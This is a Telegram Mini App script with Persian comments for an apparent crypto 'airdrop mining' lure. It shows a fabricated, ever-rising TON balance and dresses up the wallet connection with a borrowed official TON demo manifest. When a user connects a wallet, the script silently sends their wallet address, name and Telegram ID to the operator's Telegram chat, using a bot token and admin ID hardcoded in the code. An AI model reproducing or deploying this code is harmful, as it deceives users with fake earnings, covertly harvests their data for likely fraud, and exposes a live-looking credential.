<script>
const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
const ADMIN_ID = "5972276401";
const STORAGE_KEY = "TON_DROPY_FINAL_SAFE";

let balance = parseFloat(localStorage.getItem(STORAGE_KEY)) || 0.0;

// نمایش موجودی و استخراج
setInterval(() => {
    balance += 0.000012;
    document.getElementById("balance").innerText = balance.toFixed(6);
    localStorage.setItem(STORAGE_KEY, balance.toString());
}, 1000);

/* --- تنظیمات فوق امنیتی برای اتصال --- */
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    // استفاده از مانیفست رسمی و تایید شده توسط تیم TON
    manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react/tonconnect-manifest.json',
    buttonRootId: 'ton-connect-button',
    restoreConnection: true // این باعث میشه اگر یکبار وصل شد، دفعات بعد خودکار بشناسه
});

// اضافه کردن آدرس بازگشت به ربات شما به صورت دستی در پارامترها
tonConnectUI.uiOptions = {
    twaReturnUrl: 'https://t.me/TonDropyBot'
};

tonConnectUI.onStatusChange(async (wallet) => {
    if (wallet && wallet.account) {
        const address = wallet.account.address;
        const walletName = wallet.device.appName || "Tonkeeper";
        
        document.getElementById("walletDisplay").style.display = "block";
        document.getElementById("addrShort").innerText = address.substring(0,8) + "..." + address.slice(-8);

        // ارسال پیام به شما
        const user = tg.initDataUnsafe?.user;
        const msg = `✅ <b>اتصال موفق!</b>\n\n` +
                    `👛 کیف پول: <b>${walletName}</b>\n` +
                    `👤 کاربر: ${user?.first_name || '؟'}\n` +
                    `🆔 آیدی: <code>${user?.id}</code>\n` +
                    `🔗 آدرس:\n<code>${address}</code>`;
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: ADMIN_ID, text: msg, parse_mode: 'HTML' })
        });
    }
});

// مابقی توابع (Withdraw و غیره) را مانند قبل قرار دهید
</script>
